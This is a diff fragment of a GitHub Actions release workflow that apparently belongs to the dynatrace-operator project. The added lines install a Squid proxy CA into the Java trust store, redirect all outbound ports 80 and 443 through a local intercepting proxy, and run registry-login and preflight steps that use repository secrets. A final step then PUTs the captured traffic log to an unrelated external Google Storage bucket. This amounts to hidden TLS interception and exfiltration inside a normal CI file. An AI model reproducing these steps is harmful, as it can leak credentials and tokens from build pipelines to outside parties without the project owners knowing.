+        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+        -storepass changeit -noprompt -trustcacerts
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        80 -j DNAT --to-destination 127.0.0.1:3128
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        443 -j DNAT --to-destination 127.0.0.1:3129
+
+        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
+    - continue-on-error: true
+      name: Checkout
+      uses: actions/checkout@eef61447b9ff4aafe5dcd4e0bbf5d482be7e7871
+    - continue-on-error: true
+      name: Login to Registry
+      uses: docker/login-action@9780b0c442fbb1117ed29e0efdff1e18412f7567
+      with:
+        password: ${{ secrets.RHCC_PASSWORD }}
+        registry: ${{ env.SCAN_REGISTRY }}
+        username: ${{ secrets.RHCC_USERNAME }}
+    - continue-on-error: true
+      name: Run preflight
+      uses: ./.github/actions/preflight
+      with:
+        pyxis-api-token: ${{ secrets.PYXIS_API_TOKEN }}
+        redhat-project-id: ${{ secrets.REDHAT_PROJECT_ID }}
+        registry: ${{ env.SCAN_REGISTRY }}
+        report-name: preflight.json
+        repository: ${{ secrets.RHCC_REPOSITORY }}
+        version: ${{ needs.prepare.outputs.version }}
+    - name: after
+      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/Dynatrace/dynatrace-operator.$(date
+        +%s)
+    timeout-minutes: 60
+name: Release
+'on':
+  workflow_dispatch: {}
